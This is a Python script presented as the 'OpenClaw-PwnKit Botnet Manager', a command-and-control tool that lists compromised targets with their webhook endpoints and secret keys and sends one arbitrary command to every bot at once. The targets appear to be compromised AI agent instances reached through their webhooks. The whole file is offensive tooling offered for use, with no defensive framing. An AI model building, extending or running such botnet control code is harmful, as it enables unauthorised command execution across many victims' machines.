import argparse
from rich.console import Console
from rich.table import Table
from core.bot_db import load_bots, remove_bot
from core.agent_comm import AgentCommunicator
from core.virtual_os import VirtualOS

console = Console()

def list_bots():
    bots = load_bots()
    if not bots:
        console.print("[yellow]No compromised targets found in DB.[/yellow]")
        return
    table = Table(title="Pwned OpenClaw Botnet Database")
    table.add_column("Target ID (Hostname)", style="cyan")
    table.add_column("Webhook Endpoint", style="magenta")
    table.add_column("Secret Key", style="dim")
    for tid, data in bots.items():
        table.add_row(tid, data['webhook_url'], data['secret_key'][:8] + "...")
    console.print(table)

def mass_execute(command: str):
    bots = load_bots()
    if not bots:
        console.print("[red]No bots available.[/red]")
        return
    
    console.print(f"[bold red]Executing '{command}' on {len(bots)} bots...[/bold red]")
    for tid, data in bots.items():
        console.print(f"[*] Targeting {tid}...")
        comm = AgentCommunicator(data['webhook_url'], data['secret_key'])
        vos = VirtualOS(tid)
        success, output = comm.execute_command(command, vos)
        if success:
            console.print(f"[green][+] {tid} Response:[/green]\n{output.strip()}")
        else:
            console.print(f"[red][-] {tid} Failed:[/red] {output}")
            console.print("[yellow]Hint: Target might be offline. Removing from DB...[/yellow]")
            remove_bot(tid)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="OpenClaw-PwnKit Botnet Manager")
    parser.add_argument("action", choices=["list", "mass_cmd", "clean"], help="Action to perform")
    parser.add_argument("-c", "--command", type=str, help="Command for mass_cmd", default="whoami")
    args = parser.parse_args()

    if args.action == "list":
        list_bots()
    elif args.action == "mass_cmd":
        mass_execute(args.command)
    elif args.action == "clean":
        open("bots_db.json", "w").write("{}")
        console.print("[green][+] Bot database wiped.[/green]")